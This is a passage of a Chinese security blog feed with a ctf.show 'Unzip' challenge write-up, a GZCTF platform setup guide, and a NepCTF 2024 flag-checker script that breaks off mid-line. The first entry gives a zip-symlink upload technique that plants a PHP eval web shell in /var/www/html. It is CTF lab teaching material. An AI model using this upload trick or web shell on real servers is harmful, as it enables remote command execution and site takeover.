    <content type="html"><![CDATA[<p>前言：😋，看到好友包师傅每日一题，我也打算开个每日一题，记录一下内容。</p><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p>[在线靶场][<a href="https://ctf.show/challenges#Unzip-4002">https://ctf.show/challenges#Unzip-4002</a>]</p><p>初始界面是一个文件上传，随手上传一个一句话木马，进入页面。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this! </span><br></code></pre></td></tr></table></figure><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><p>代码做了一个简单的限制，要求的zip文件，这也是一个提示我们需要上传zip文件。</p><p>执行命令，在/tmp目录下解压文件内容，这里-o是强覆盖，会覆盖名称一样的文件</p><p>众所周知，正常环境的代码需要在/var/www/html下才能执行那题目固定了在tmp下，所以我们要尝试建立tmp和/var/www/html的联系，这里就考察了软链接的知识点。<a href="https://www.bilibili.com/video/BV16Q4y1y7xS/?p=33">详细教学</a>，可以看这个视频，我们可以通过建立一个软链接先指向，再解压，就可以再/var/www/html有shell了。</p><h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2><p>首先创建软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /var/www/html orange<br></code></pre></td></tr></table></figure><p>然后进行第一次压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip --symlinks orange1.zip orange<br></code></pre></td></tr></table></figure><p>symlinks的作用是不把orange这个软链接当作普通的文件，而是当作指向目录或者文件的存在</p><p>写一个一句话木马在shell.php下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后保存在orange目录下，执行第二次压缩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -r orange2.zip orange<br></code></pre></td></tr></table></figure><p>先上传orange1.zip，进行在靶场上执行的就是解压进行了链接</p><p>再上传orange2.zip，这次解压把shell.php解压到了orange的目录下，成功的把shell.php传到了/var/www/html目录下</p><p>打开shell.php，执行命令</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-02203229.png" alt="2024-09-02 203229"></p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次GZCTF搭建及动态容器</title>
    <link href="/2024/09/02/%E6%9D%82%E8%B0%88/%E8%AE%B0%E4%B8%80%E6%AC%A1GZCTF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8/"/>
    <url>/2024/09/02/%E6%9D%82%E8%B0%88/%E8%AE%B0%E4%B8%80%E6%AC%A1GZCTF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>前言：因为学校需要招新生要搭建平台，简单的学习了一下。</p><h1 id="gzctf配置"><a class="markdownIt-Anchor" href="#gzctf配置"></a> GZCTF配置</h1><p>环境 ubuntu 22.04</p><h2 id="第一步"><a class="markdownIt-Anchor" href="#第一步"></a> 第一步</h2><p>更新源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update <br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/update.png" alt="update"></p><h2 id="第二步"><a class="markdownIt-Anchor" href="#第二步"></a> 第二步</h2><p>安装docker和docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install docker.io docker-compose<br></code></pre></td></tr></table></figure><p>中途按Y和Enter即可。</p><h2 id="第三步"><a class="markdownIt-Anchor" href="#第三步"></a> 第三步</h2><p>docker换源</p><p>由于docker今年在中国地区的限制，需要换源才能正常的拉取。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/docker<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://do.nark.eu.org&quot;</span>,<br>        <span class="hljs-string">&quot;https://dc.j8.work&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.m.daocloud.io&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerproxy.com&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.nju.edu.cn&quot;</span><br>    ]<br>&#125;<br>EOF<br><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-built_in">sudo</span> systemctl restart docker<br></code></pre></td></tr></table></figure><h2 id="第四步"><a class="markdownIt-Anchor" href="#第四步"></a> 第四步</h2><p>配置文件appsettings.json和docker-compose.yml，可以新建GZCTF，然后将这两个文件放在这里</p><p>appsettings.json是环境的核心</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;AllowedHosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ConnectionStrings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Database&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=这里填写数据库密码&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;EmailConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;SendMailAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a@a.com&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Smtp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;Port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">587</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;XorKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;asdqwe&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ContainerProvider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Docker&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;Kubernetes&quot;</span><br>      <span class="hljs-attr">&quot;PortMappingType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Default&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;PlatformProxy&quot;</span><br>      <span class="hljs-attr">&quot;EnableTrafficCapture&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;PublicEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//服务器官网ip</span><br>      <span class="hljs-comment">// optional</span><br>      <span class="hljs-attr">&quot;DockerConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;SwarmMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;Uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;RequestLogging&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;DisableRateLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;RegistryConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;ServerAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;CaptchaConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Provider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;CloudflareTurnstile&quot; or &quot;GoogleRecaptcha&quot;</span><br>      <span class="hljs-attr">&quot;SiteKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;Your SITE_KEY&gt;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;SecretKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;Your SECRET_KEY&gt;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-comment">// optional</span><br>      <span class="hljs-attr">&quot;GoogleRecaptcha&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;VerifyAPIAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;RecaptchaThreshold&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.5&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ForwardedOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;ForwardedHeaders&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;ForwardLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;TrustedNetworks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>上面的内容对于邮箱的验证没有填写，你需要填写<strong>数据库的密码</strong>，如果使用服务器的换填写服务器的ip，完全的功能请参照<a href="https://docs.ctf.gzti.me/zh/config/appsettings">GZCTF官方文档</a>。</p><p>docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3.0&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gzctf:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">gztime/gzctf:latest</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;GZCTF_ADMIN_PASSWORD=这里填管理员密码&quot;</span><br>      <span class="hljs-comment"># choose your backend language `en_US` / `zh_CN` / `ja_JP`</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:8080&quot;</span> <span class="hljs-comment">#如果备案了可以选择80</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/files:/app/files&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span><br>      <span class="hljs-comment"># - &quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot; # this is required for k8s deployment</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span> <span class="hljs-comment"># this is required for docker deployment</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br> <br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">postgres:alpine</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;POSTGRES_PASSWORD=数据库密码&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/db:/var/lib/postgresql/data&quot;</span><br></code></pre></td></tr></table></figure><p>这里填写管理员密码，数据库密码(<strong>必须个上一个的保持一致</strong>),端口看情况进行修改。</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E9%85%8D%E7%BD%AE.png" alt="配置"></p><h2 id="第五步"><a class="markdownIt-Anchor" href="#第五步"></a> 第五步</h2><p>拉取docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/docker.png" alt="docker"></p><p>等出现两个done之后就完成了，访问一下网页</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E7%BD%91%E9%A1%B5.png" alt="网页"></p><h1 id="动态容器出题"><a class="markdownIt-Anchor" href="#动态容器出题"></a> 动态容器出题</h1><p>我用的是探姬和巨魔师傅的项目，这里贴一下。<a href="https://github.com/CTF-Archives/ctf-docker-template">项目</a></p><p>正常的题型直接更换src就行了,我用的xftp上传到服务器，最后docker 拉取一下就行，这里以web题目为例子。</p><p>默认的网页是index需要注意一下。</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/%E4%BE%8B%E9%A2%98.png" alt="例题"></p><p>这是准备好的例题，然后我们使用xftp上传到服务器上</p><p><img src="/../../images/%E6%9D%82%E8%B0%88/gzctf/1.png" alt="1"></p><p>弄好之后创建比赛，选个web题动态容器，输入webtest就行，然后测试一下。</p><p>有dockerhub的也可以选择先传到那上面，看自己的选择。</p><h1 id="tip"><a class="markdownIt-Anchor" href="#tip"></a> tip</h1><p>1.探姬项目的pwn题目默认是9999端口需要自己改一下</p><p>2.环境不能上传内容过大的附件，可以先上传网盘，再把链接贴上去。</p><p>3.流量抓捕我并没有设置，当时也忘了，等明年再说吧，详情也可以看官方文档</p><p>4.弄不好可以全删重新弄，orz，好事多磨。</p><h1 id="缝缝补补"><a class="markdownIt-Anchor" href="#缝缝补补"></a> 缝缝补补</h1><h2 id="数据库相关"><a class="markdownIt-Anchor" href="#数据库相关"></a> 数据库相关</h2><ul><li>为了方便数据库修改，给数据库映射了端口，当然有一定的安全隐患，需要对安全组，密码强度有一定要求</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">db:<br><span class="hljs-code">    image: postgres:alpine</span><br><span class="hljs-code">    restart: always</span><br><span class="hljs-code">environment:</span><br><span class="hljs-code">      - &quot;POSTGRES_PASSWORD=XXXXX&quot;</span><br><span class="hljs-code">    ports:</span><br><span class="hljs-code">      - &quot;5432:5432&quot;</span><br><span class="hljs-code">    volumes:</span><br><span class="hljs-code">      - &quot;./data/db:/var/lib/postgresql/data&quot;</span><br></code></pre></td></tr></table></figure><p>然后可以在本地进行连接(注意安全问题！！！)</p><ul><li>修改数据库密码记得两个文件同时修改</li></ul>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nepctf2024复盘</title>
    <link href="/2024/08/28/nepctf/nepctf2024/"/>
    <url>/2024/08/28/nepctf/nepctf2024/</url>
    
    <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="nemophila"><a class="markdownIt-Anchor" href="#nemophila"></a> Nemophila</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提示：宝箱怪只会提示你口令正确与否，请你试试吧！&quot;</span>)<br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Turn in your guess: &#x27;</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) !=<span class="hljs-number">48</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;长度不对！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(flag.capitalize()[<span class="hljs-number">0</span>]) != <span class="hljs-number">83</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> flag[<span class="hljs-number">0</span>].islower():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[-<span class="hljs-number">3</span>:] != <span class="hljs-string">&quot;ve&#125;&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> flag.count(<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)) != <span class="hljs-number">4</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> base64.b64encode((flag[<span class="hljs-number">10</span>:<span class="hljs-number">13</span>]+flag[<span class="hljs-number">28</span>:<span class="hljs-number">31</span>]).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode() != <span class="hljs-string">&#x27;RnJpSGlt&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]) &gt; <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]) &lt; <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(flag[<span class="hljs-number">24</span>:<span class="hljs-number">26</span>]),<span class="hljs-number">2</span>,<span class="hljs-number">5</span>) != <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;好像有点不对！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br>number = flag[<span class="hljs-number">33</span>] + flag[<span class="hljs-number">41</span>] + flag[<span class="hljs-number">43</span>:<span class="hljs-number">45</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(number) * <span class="hljs-number">9_27</span> != <span class="hljs-number">1028970</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> number.isnumeric():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;还是不对呢！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">35</span>:<span class="hljs-number">41</span>].replace(<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>) != <span class="hljs-string">&quot;1t1rna&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">31</span>:<span class="hljs-number">33</span>].swapcase() != <span class="hljs-string">&quot;ME&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这不是我!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">len</span>,flag.split(<span class="hljs-string">&quot;_&quot;</span>))) != [<span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>] <span class="hljs-keyword">and</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">len</span>,flag.split(<span class="hljs-string">&quot;&amp;&quot;</span>))) != [<span class="hljs-number">17</span>, <span class="hljs-number">9</span>, <span class="hljs-number">20</span>]:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;换个顺序！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">min</span>(flag[:<span class="hljs-number">2</span>].swapcase())) != <span class="hljs-number">69</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try again!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)    <br><br><span class="hljs-keyword">if</span> flag[<span class="hljs-number">2</span>] + flag[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] != <span class="hljs-string">&quot;cet4&quot;</span>[:<span class="hljs-number">3</span>]:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我不想考四级！&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br>new=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag[<span class="hljs-number">7</span>:<span class="hljs-number">10</span>] + flag[<span class="hljs-number">18</span>] + flag[<span class="hljs-number">26</span>]: new += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i) + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> new != <span class="hljs-string">&quot;jt|Df&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please try 